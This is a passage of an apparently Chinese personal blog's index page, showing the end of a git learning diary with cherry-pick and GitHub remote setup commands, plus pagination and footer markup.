<p>将其他提交记录直接放到当前分支下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git cherry-pick (name1) (name2)</span><br></pre></td></tr></table></figure>



<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>更多练习：<a href="">learngitbranching.js.org</a></p>
<p>github添加一个远程库命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:XXXXX</span><br><span class="line">git branch -M main</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure>

</div></div><a class="button-hover more" href="/SecondBC/2022/10/11/git%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/#more">阅读全文</a></div></div><div id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/SecondBC/">&lt;i class&#x3D;&quot;fas fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/SecondBC/">1</a><span class="page-number current">2</span><a class="page-number" href="/SecondBC/page/3/">3</a><a class="page-number" href="/SecondBC/page/4/">4</a><a class="extend next" rel="next" href="/SecondBC/page/3/">&lt;i class&#x3D;&quot;fas fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></div></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fas fa-user"></i></span><span id="busuanzi_value_site_uv"></span><span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fas fa-eye"></i></span><span id="busuanzi_value_site_pv"></span><span></span></div><div class="copyright">&copy;2022 ～ 2024 By Second_BC</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/copy.js"></script><!--script(src=url)--></body></html>